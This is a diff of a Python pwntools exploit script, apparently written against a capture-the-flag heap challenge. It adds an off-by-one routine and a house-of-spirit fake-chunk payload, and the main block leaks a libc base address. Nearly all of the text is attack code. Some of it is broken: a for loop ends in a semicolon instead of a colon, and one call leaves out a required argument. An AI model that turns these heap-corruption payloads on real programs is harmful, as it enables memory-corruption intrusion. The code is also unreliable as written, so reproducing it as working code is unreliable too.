@@ -24,7 +24,7 @@ def DEBUG():
 def loop(name, age, reason, comment, finish = False):
     io.sendlineafter("name: ", name)
     io.sendlineafter("age: ", str(age))
-    DEBUG()
+    #  DEBUG()
     io.sendafter("movie? ", reason)
     io.sendafter("comment: ", comment)
     #  if finish == False:
@@ -40,10 +40,14 @@ def getBase():
     pause()
     return libcBase
 
-#  def getStack():
-    #  loop("M4x", 21, "|" * 0x18, "comment")
+def offByOne():
+    for i in xrange(100);
+        loop("M4x", 21, "|" * 0x18, "comment")
+        io.sendlineafter("<y/n>: ", "y")
 
-
+def houseOfSpirit():
+    payload = p32(0) + p32(0x41) + cyclic(56) + p32(0) + p32(0x41)
+    loop("M4x", 21, payload)
 if __name__ == "__main__":
     libcBase = getBase()
     
